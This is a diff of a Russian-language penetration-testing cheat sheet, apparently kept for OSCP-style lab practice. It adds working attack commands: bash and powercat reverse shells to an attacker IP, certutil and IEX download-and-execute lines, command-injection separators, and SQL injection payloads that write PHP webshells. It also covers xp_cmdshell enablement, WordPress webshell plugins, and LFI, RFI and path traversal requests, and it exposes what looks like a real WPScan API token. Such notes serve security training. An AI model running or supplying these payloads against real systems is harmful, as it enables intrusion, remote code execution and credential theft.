@@ -78,13 +78,14 @@ python -m http.server 80
 		скачать скрипт превышения прав или скрипт поиска полезной информации (linpeas.sh)
 -	certuil.exe -urlcache -f http://<ip>:<port>/winpeas.exe
 		использование certutil в windows в качестве клиента для скачки winpeas.exe
-bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
-	однострочный шел код (больше на pentest monkey)
+bash -i >& /dev/tcp/192.168.45.231/4444 0>&1
+	однострочный reverse shell (больше на pentest monkey)
 picture upload - possible reverse shell (php file uploading)
-python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 	запуск удобной командной оболочки, предватительно проверить, есть ли питон, иначе - другая командя для tty shell
 	echo $0 - в каком шеле мы находимся (в каком скрипте)
 https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
+https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 	однострочные reverse шелы
 Ctrl+U/Ctrl+Shift+U
 	кодирование/декодирование спец. сиволов в Burp
@@ -92,15 +93,13 @@ Ctrl+U/Ctrl+Shift+U
 ssh -i id_rsa -p 2222 dave@192.168.178.201
 	id_rsa - private key, используется с парольной фразой, которую также запросят ввести, файл должен иметь права 600 (!!!)
 Первым делом на удаленной машине:
-id		                             
-pwd
 history
+id
 sudo -l	какие команды доступны из-под sudo для данного пользователя
 sudo -u <username> id
 gtfobin
 	повышение прав доступа (privilege excalation), web портал с командами повышения до root
 	если sudo -l дало какой-то результат или в системе есть SUID
-
 
 =================RECON LINUX
 linPEAS
@@ -120,6 +119,9 @@ xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.50.245 /dynamic-
 hURL	декодирование base64 и другого
 
 ================RECON WINDOWS
+(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell
+	проверка где запущена команда: в cmd или powershell
 systeminfo
 hostname
 wmic qfe	обновления
@@ -165,17 +167,15 @@ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershe
 СХЕМА АТАКИ: !!!UAC на 212 должен быть отключен
 	200: запущен impacket-ntlmrelayx и ожидает соединения от 211 к SMB серверу, ntlmrelayx подключает 211 к 212 с помощью
 	перехваченного хеша, где выполняется base64 реверс шел к 200, который ожидает подключания по nc 
-echo -n "Get-Process" | iconv -t UTF-16LE | base64 -w 0
+echo -n 'Get-Process' | iconv -t UTF-16LE | base64 -w 0
 	подготовка команды Get-Process для windows, спец. символы кодируются 2 байтами
 	-n убирает перенос строки в конце - нужно для Powershell, -w 0 выводит base64 одной строкой
+	ВАЖНО!!! команда должна быть в одинарных кавычках, а не двойных (bash будет пытаться раскрыть переменные, начинающиеся с $)
 1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
 	сканирование портов, когде нет nmap
 
-================RECON WEB
-curl http://<ip>/robots.txt
-GET: параметры в URL, POST: параметры в теле запроса
-
-XSS: стащить куки, выпонить код в браузере жертвы, получить куки, nonce
+================XSS/CSRF
+стащить куки, выпонить код в браузере жертвы, получить куки, nonce
 ключевые символы: < > ' " { } ;
 	1. Между тегами:	<div>ТВОЙ_ВВОД</div>		<--	<script>alert(1)</script>
 								<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
@@ -192,16 +192,18 @@ https://jscompress.com/
 СХЕМА АТАКИ (nonce): загрузка страницы (ajax), извлечение nonce, использование его для операции добавления своего аккаунта админа
 	https://shift8web.ca/craft-xss-payload-create-admin-user-in-wordpress-user/
 CSRF: выполнить операцию на сайте за пользователя, который уже залогинен там
-ДОБАВЛЕНИЕ ПЛАГИНА WORDPRESS: <<wp-plugin-webshell.php>> -> добавить в zip архив, загрузить и активировать
-	curl -X POST '192.168.177.16/wp-content/plugins/webshell/webshell.php' --data "action=exec&cmd=id"
-	curl -X POST '192.168.177.16/wp-content/plugins/webshell/webshell.php' --data "action=download&cmd=/etc/passwd"
+ДОБАВЛЕНИЕ ПЛАГИНА WORDPRESS: <<wp-plugin-reverse-shell.php>> -> добавить в zip архив, загрузить и активировать,
+	в админке в меню внизу появится раздел Reverse shell
+ДОБАВЛЕНИЕ ПЛАГИНА WORDPRESS: <<wp-plugin-webshell.php>> -> добавить в zip архив (без .php), загрузить и активировать
+	curl -X POST '192.168.177.16/wp-content/plugins/wp-plugin-webshell/wp-plugin-webshell.php' --data "action=exec&cmd=id"
+	curl -X POST '192.168.177.16/wp-content/plugins/wp-plugin-webshell/wp-plugin-webshell.php' --data "action=download&cmd=/etc/passwd"
 	wp-plugin-webshell-console.py -t 192.168.177.16
 
 ================PATH TRAVERSAL
 curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
 curl --path-as-is http://192.168.171.16:3000/public/plugins/mysql/../../../../../../../../../../etc/passwd
 curl --path-as-is http://192.168.164.193:3000/public/plugins/mysql/..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CUsers%5Cinstall.txt
-	для Windows: не надо писать "C:", а "%5C" = "\"
+	для Windows: не надо писать "C:", а "%5C" - это "\"
 	--path-as-is обязателен, если ../ в пути URL, а не в параметрах (после "?")
 
 ================LFI
@@ -219,7 +221,6 @@ curl "http://192.168.222.16/meteor/index.php?page=http://<attack ip>/simple-back
 curl "http://192.168.222.16/meteor/index.php?page=http://<attack ip>/php-reverse-shell.php"
 	на атакующей машине помимо сервера (python -m http.server 80) еще запустить "nc -lvp 4444", также поменять ip и порт в php скрипте
 
-
 ================PHP WRAPPER
 curl http://192.168.222.16/meteor/index.php?page=php://filter/resource=admin.php
 	просто выполняет код страницы/выводит html
@@ -231,10 +232,87 @@ data://text/plain;base64,PD9waHAgZWNobyAiaGVsbG8iOyA/Pg==
 curl "http://192.168.222.16/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
 	исполняет команду ls на странице
 
+================SHELL UPLOAD
+curl http://192.168.180.16/simple-backdoor.pHp?cmd=ls
+	а для POST запроса команда после ? переносится в тело: "cmd=ls"
+curl http://192.168.180.16/simple-backdoor.pHp?cmd=powershell+-enc+<base64 encoded powershell command>
+curl http://192.168.180.16/php-reverse-shell.php 
+	перед использованием настроить ip, port и запустить nc -vlp 4444
+
+================COMMAND INJECTION
+Разделители, идущие после команды:
+	cmd1|cmd2
+	cmd1&&cmd2
+	cmd1;cmd2
+	$(pwd)
+	`pwd`
+IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.231/powercat.ps1");powercat -c 192.168.45.231 -p 4444 -e powershell 
+IEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.45.231%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.45.231%20-p%204444%20-e%20powershell
+	заброска powercat (python -m http.server 80) с запуском reverse shell (nc -nlvp 4444)
+cmd=cmd.exe /c "cd /d %TEMP% && certutil -urlcache -split -f http://192.168.45.231/ncat.exe ncat.exe && ncat.exe 192.168.45.231 4444 -e cmd.exe"
+	reverse shell, если есть только cmd.exe, надо повесить python -m http.server на папку с ncat.exe, открыть порт nc -lvp 4444
+
+================SQL INJECTION. MySQL 3306
+mysql -u root -p 'root' -h 192.168.50.16 -P 3306 --skip-ssl-verify-server-cert
+	подключение к MySQL, команды: "show databases;", "select table_name from information_schema.tables;"
+	"show tables from information_schema;" = "SELECT schema_name FROM information_schema.schemata;"
+	describe (= show columns from) <table name> - получить описание структуры ("describe information_schema.tables")
+	таблицы information_schema: schemata (инфа о базах), tables, columns (колонки table_name, column_name, table_schema)
+select version()	-- версия
+select user()  		-- = system_user(), подключенный пользователь @ хост, с которого он подключился
+select database()	-- текущая БД
+select @@hostname	-- имя хоста сервера
+select sleep(3)
+select count(*) from <tablename>; -- // количество колонок
+select load_file('/etc/passwd')  -- // чтение файла (нужны права)
+' union select ' \"<?php system(\$_GET['cmd']);?>\"' into outfile '/var/www/html/tmp/webshell.php'  -- //
+' union select ' \"<?php system(\$_GET['cmd']);?>\"' into outfile 'C:\\Windows\\Temp\\shell.php' -- //
+	запись в файл (нужны права, файл не должен существовать), проверять количество столбцов не обязательно, но желательно
+' or 1=1 -- //	хотя бы 1 пробел после --
+' or 1=1 in (select version()) -- //
+' or 1=1 in (select database()) -- // текущая БД
+' or 1=1 in (select schema_name from information_schema.schemata) -- // все БД
+' or 1=1 in (select table_name 	from information_schema.tables	WHERE table_schema='offsec') -- // таблицы в БД offsec
+' or 1=1 in (select column_name	from information_schema.columns	WHERE table_name='users') -- // колонки в таблице users в БД offsec
+' or 1=1 in (select username from users) -- //
+
+' ORDER BY 6-- // проверить количество колонок в используемом запросе - надо выровнять с количеством колонок в основном запросе
+%' UNION SELECT null, database(), user(), version(), null -- // % - любое количество любых символ (_ - 1 символ)
+' UNION select null, table_name, database(), null, null		from information_schema.tables 	WHERE table_schema=database() -- //
+' UNION select null, table_name, column_name, null, null	from information_schema.columns	WHERE table_name='users' -- //
+' UNION select null, id, username, password, description 	from users -- //
+
+' and 1=2 -- // проверка, что слепая инъекция может быть проведена, при 1=1 запись выводится, при 1=2 - нет
+' and if(1=1,sleep(3),0) -- // тоже самое с проверкой по времени, 1=1 выполнится через 3 секунды, 1=2 мгновенно
+	с проверкой по времени запрос не выводит результат, т.к. sleep(3) возвращает 0, 0 (3й арг.) тоже возвращает 0, if возвращает false
+	для того, чтобы результат запроса был выполнен, if должен вернуть true: ' and if(1=2, sleep(3), 1)
+sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user [--dump [-T <table name> [-C <column1, column2>]]]
+	запускает проверку уязвимости GET параметра user внутри '?user=1', --dump - скопировать всю БД, --threads 10 - для ускорения
+sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
+	интерактивный шел, запрос в txt файле, в нем уязвимый параметр 'item' в POST запросе, --os-shell - шел подключение
+	--web-root - доступная на запись директория
+wpscan --url http://alvida-eatery.local/ --api-token TlTUbNppqaZ2NrsS6jFlH27Voc7iAy1jW3yPtFCzmfM
+	сканирование сайта, поиск уязвимостей движка word press (плагины, пользователи, открытые директории)
+================SQL INJECTION. MSSQL 1433
+impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+	подключение в MSSQL, системные команды: "select @@version", "SELECT name FROM sys.databases;"
+	sys.databases, sys.tables, sys.columns, sys.processes - представления
+	select name from sys.databases; (= exec sp_databases;) - список БД
+	select * from model.sys.tables; - sys.tables внутри конкретной БД выводит ее таблицы, тут для базы model
+		SELECT * FROM master.sys.views; - также вывести представления (view, виртуальные таблицы)
+	select * from model.information_schema.tables; - универсальный запрос просмотра таблиц в БД model
+	select * from offsec.dbo.users; - обращение к таблице в формате <БД>.<схема>.<таблица>	
+Активация работы функции xp_cmdshell:
+	EXECUTE sp_configure 'show advanced options', 1;
+	RECONFIGURE;
+	EXECUTE sp_configure 'xp_cmdshell', 1;
+	RECONFIGURE;
+	EXECUTE xp_cmdshell 'whoami';	запуск команды
+
 
 ================FUZZING
 gobuster - на Go, только консоль (более современная версия dirb и dirbuster)
-gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://192.168.10.10 -w /usr/share/wordlists/dirb/common.txt
 	есть ключ -t (thread), по умолчанию 10
 	скрипт --script=http-enum в nmap также перебирает папки на хосте (вместе с -p80)
 gobuster vhost -u http://target.com -w subdomains.txt
@@ -368,7 +446,10 @@ fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt file.zip
 	словари для пентеста
 /usr/share/webshells/
 	веб шелы для php/perl/asp и другие
-	
+/usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1
+	аналог nc для powershell (текстовый файл, поэтому проще загружать, в отличие от бинарного nc)	
+~/.ssh/authorized_keys
+	файл на сервере со списком публичных ключей (ssh -i priv_key user@ip)
 
 
 
